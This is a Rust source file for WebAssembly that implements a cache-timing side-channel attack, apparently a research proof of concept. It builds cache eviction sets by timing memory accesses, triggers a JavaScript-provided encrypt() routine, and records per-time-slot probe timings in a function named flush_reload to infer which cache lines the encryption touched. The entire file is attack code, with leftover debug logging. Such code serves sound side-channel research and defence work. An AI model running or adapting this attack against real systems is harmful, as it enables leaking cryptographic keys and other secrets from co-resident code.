use alloc::{boxed::Box, vec, vec::Vec};

use self::env::{random, timed_access, timed_hit};

const CACHE_LINE_SIZE: usize = 64;
const CACHE_ASSOCIATIVITY: usize = 12;
const BUFFER_SIZE: usize = 20 * 1024;

mod env {
    mod unsafe_js {
        #[link(wasm_import_module = "js")]
        extern "C" {
            pub fn random() -> f64;
            pub fn encrypt();
            pub fn log(value: u64);
        }
    }
    mod unsafe_wasm {
        #[link(wasm_import_module = "wasm")]
        extern "C" {
            pub fn get_time() -> u64;
            pub fn timed_access(offset: u32) -> u64;
            pub fn timed_hit(offset: u32) -> u64;
            pub fn evict(eviction_set: u32);
            pub fn timed_miss(offset: u32, eviction_set: u32) -> u64;
        }
    }

    pub fn random() -> f64 {
        unsafe { unsafe_js::random() }
    }
    pub fn encrypt() {
        unsafe { unsafe_js::encrypt() }
    }
    pub fn log(value: u64) {
        unsafe { unsafe_js::log(value) };
    }
    pub fn get_time() -> u64 {
        unsafe { unsafe_wasm::get_time() }
    }
    pub fn timed_access(offset: u32) -> u64 {
        unsafe { unsafe_wasm::timed_access(offset) }
    }
    pub fn timed_hit(offset: u32) -> u64 {
        unsafe { unsafe_wasm::timed_hit(offset) }
    }
    pub fn timed_miss(offset: u32, eviction_set: u32) -> u64 {
        unsafe { unsafe_wasm::timed_miss(offset, eviction_set) }
    }
    pub fn evict(eviction_set: u32) {
        unsafe { unsafe_wasm::evict(eviction_set) }
    }
}

#[inline(always)]
fn wait(number_of_cycles: u32) {
    let mut i = 0;
    while i < number_of_cycles {
        i += 1;
    }
}

#[no_mangle]
pub fn indices_to_raw_linked_list(indices: Vec<u32>) -> Vec<u32> {
    let mut vec: Vec<u32> = vec![0; BUFFER_SIZE / core::mem::size_of::<u32>()];
    let base_ptr = vec.as_ptr() as u32;
    env::log(base_ptr as u64);
    let mut pointer = indices[0];
    env::log(123123);
    env::log(vec.len() as u64);
    for i in 0..indices.len() {
        env::log(pointer as u64);
        vec[pointer as usize] = indices[i] + base_ptr;
        env::log(i as u64);
        pointer = indices[i];
        env::log(i as u64);
    }
    vec[pointer as usize] = 0x00;
    vec
}

#[no_mangle]
pub fn generate_candidate_set() -> Vec<u32> {
    let number_of_candidates = BUFFER_SIZE / CACHE_LINE_SIZE;
    let mut candidates: Vec<u32> = (0..number_of_candidates)
        .map(|i| (i * CACHE_LINE_SIZE) as u32)
        .collect();
    (0..number_of_candidates).for_each(|i| {
        let random_index: usize = (env::random() * ((candidates.len() - 1) as f64)) as usize;
        candidates.swap(random_index, i);
    });
    candidates
}

#[no_mangle]
pub fn generate_eviction_set(probe: u32, candidate_set: &Vec<u32>, threshold: u64) -> Vec<u32> {
    let mut candidate_set = candidate_set.clone();
    let mut eviction_set: Vec<u32> = Vec::new();
    while let Some(random_offset) = candidate_set.pop() {
        if eviction_set.len() >= CACHE_ASSOCIATIVITY {
            break;
        }
        let mut new_eviction_set: Vec<u32> = eviction_set.clone();
        new_eviction_set.append(&mut candidate_set.clone());
        let linked_list = indices_to_raw_linked_list(new_eviction_set);
        if threshold < env::timed_miss(linked_list.as_ptr() as u32, probe) {
            eviction_set.push(random_offset);
        }
    }
    eviction_set
}

#[no_mangle]
pub extern "C" fn my_alloc(len: usize) -> *mut u8 {
    let align = core::mem::align_of::<usize>();
    let layout = unsafe { core::alloc::Layout::from_size_align_unchecked(len, align) };
    unsafe { alloc::alloc::alloc(layout) }
}

#[no_mangle]
pub extern "C" fn my_dealloc(ptr: *mut u8, len: usize) {
    let align = core::mem::align_of::<usize>();
    let layout = unsafe { core::alloc::Layout::from_size_align_unchecked(len, align) };
    unsafe { alloc::alloc::dealloc(ptr, layout) }
}

#[no_mangle]
pub extern "C" fn flush_reload(
    threshold: u32,
    time_slots: u32,
    wait_cycles: u32,
    time_slot_size: u32,
    probes: *mut u32,
    probe_size: usize,
    target: *mut u8,
    target_size: usize,
) -> Box<[u32]> {
    let target = unsafe { core::slice::from_raw_parts(target, target_size) };
    let base_ptr: u32 = target.as_ptr() as u32;
    let probes = unsafe { core::slice::from_raw_parts(probes, probe_size) };

    let candidate_set: Vec<u32> = generate_candidate_set();
    let eviction_sets: Vec<Vec<u32>> = probes //config.probes
        .iter()
        .map(|offset| generate_eviction_set(*offset, &candidate_set, threshold as u64))
        .collect();
    env::encrypt();
    let results: Vec<u32> = (0..time_slots)
        .flat_map(|_| {
            // access probes
            let start = env::get_time();
            let time_slot_results: Vec<u32> = probes
                .iter()
                .map(|p| timed_access(*p + base_ptr) as u32)
                .collect();
            // evict probes
            eviction_sets
                .iter()
                .for_each(|e| env::evict(e.as_ptr() as u32));
            // wait
            while env::get_time() - start < time_slot_size as u64 {
                wait(wait_cycles);
            }
            time_slot_results
        })
        .collect();
    env::log(123);
    let boxed: Box<[u32]> = results.into_boxed_slice();
    boxed
}
